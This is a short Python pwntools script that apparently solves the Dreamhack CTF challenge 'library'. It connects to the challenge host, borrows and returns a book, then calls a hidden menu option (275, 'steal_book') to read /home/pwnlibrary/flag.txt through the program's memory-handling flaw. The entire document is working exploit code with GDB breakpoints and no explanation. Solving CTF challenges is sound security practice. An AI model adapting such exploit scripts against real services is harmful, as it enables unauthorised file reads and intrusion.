#!/usr/bin/env python3
from pwn import *

PORT =  14770
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./library', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*main+152
        	b*borrow_book+212
        	b*steal_book+407
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def borrow(select):
	p.sendlineafter(b"menu : ", b'1')
	p.sendlineafter(b"borrow? :", str(select))

def read(select):
	p.sendlineafter(b"menu : ", b'2')
	p.sendlineafter(b"read? :", str(select))

def steal(path, pages):
	p.sendlineafter(b"menu : ", str(275))
	p.sendlineafter(b"book? : ", path)
	p.sendlineafter(b"(MAX 400) : ", str(pages))


path = b"/home/pwnlibrary/flag.txt"
# path = b"/home/dinhduc/Desktop/dreamhack/lv1/pwn-library/flag.txt"
GDB()
borrow(1)
p.sendlineafter(b"menu : ", b'3')
steal(path, 256)
read(0)


p.interactive()